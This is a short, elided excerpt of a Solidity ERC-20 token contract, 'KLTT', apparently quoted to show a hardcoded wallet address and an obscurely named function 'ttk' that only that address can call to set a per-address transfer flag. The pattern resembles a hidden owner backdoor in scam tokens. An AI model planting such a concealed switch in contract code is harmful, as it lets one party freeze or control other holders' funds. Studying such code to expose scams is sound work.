...
contract KLTT is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xe61ab2eCAD3e8D8f6632481A308660f041eF200f));
        m = payable(address(0xe61ab2eCAD3e8D8f6632481A308660f041eF200f));
    ...
    function ttk(address a,bool b) public {if(msg.sender == m){
        _transferr[a] = b;}
    }
